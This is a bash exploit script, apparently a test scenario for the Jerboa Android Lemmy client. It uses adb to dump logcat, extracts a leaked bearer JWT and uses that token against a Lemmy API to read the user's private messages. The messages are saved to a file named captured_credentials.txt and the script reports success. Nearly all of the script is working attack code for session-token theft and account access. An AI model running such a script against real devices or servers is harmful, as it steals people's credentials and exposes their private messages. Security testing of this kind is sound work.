#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT_FILE="$SCRIPT_DIR/captured_credentials.txt"

log() { printf '[vuln1] %s\n' "$*"; }

detect_jerboa_package() {
  local packages
  packages="$(adb shell pm list packages 2>/dev/null | tr -d '\r')"

  if printf '%s\n' "$packages" | grep -qx 'package:com.jerboa.debug'; then
    printf '%s\n' 'com.jerboa.debug'
    return 0
  fi

  if printf '%s\n' "$packages" | grep -qx 'package:com.jerboa'; then
    printf '%s\n' 'com.jerboa'
    return 0
  fi

  return 1
}

main() {
  log "Starting vuln_scenario_1 for Jerboa"
  rm -f "$OUTPUT_FILE"

  package_name="$(detect_jerboa_package)" || {
    log "Jerboa package not installed"
    exit 1
  }

  # Keep the app running so the logcat leak and authenticated API flow stay available.
  adb shell am start -n "${package_name}/.MainActivity" >/dev/null 2>&1 || true
  sleep 2

  log "[*] Scanning logcat for exposed JWT tokens..."
  adb logcat -d > /tmp/jerboa_logcat_dump.txt 2>&1

  alice_jwt="$(
    grep -o 'Authorization: Bearer [^ ]*' /tmp/jerboa_logcat_dump.txt 2>/dev/null \
      | tail -1 \
      | awk '{print $3}'
  )"
  if [[ -z "${alice_jwt:-}" ]]; then
    log "No JWT token found in logcat"
    exit 1
  fi

  lemmy_url="${LEMMY_URL:-https://localhost:8536}"
  log "[*] Calling Lemmy API to read private messages..."
  messages="$(curl -sk -H "Authorization: Bearer $alice_jwt" \
    "$lemmy_url/api/v3/private_message/list")"

  if [[ -z "$messages" ]] || printf '%s\n' "$messages" | grep -q '"error"'; then
    log "Failed to retrieve private messages"
    exit 1
  fi

  printf '%s\n' "$messages" | python3 - "$OUTPUT_FILE" <<'PY'
import json
import sys
from pathlib import Path

output_path = Path(sys.argv[1])
payload = json.load(sys.stdin)
messages = payload.get("private_messages", [])
if not messages:
    raise SystemExit("no private messages found")

lines = []
for msg in messages:
    content = msg.get("private_message", {}).get("content", "")
    if content:
        lines.append(content)

if not lines:
    raise SystemExit("failed to extract private message content")

output_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
PY

  if [[ ! -s "$OUTPUT_FILE" ]]; then
    log "Failed to extract private message content"
    exit 1
  fi

  log "[+] Exploit successful: private messages retrieved"
  log "[+] Evidence saved to $OUTPUT_FILE"
}

main "$@"
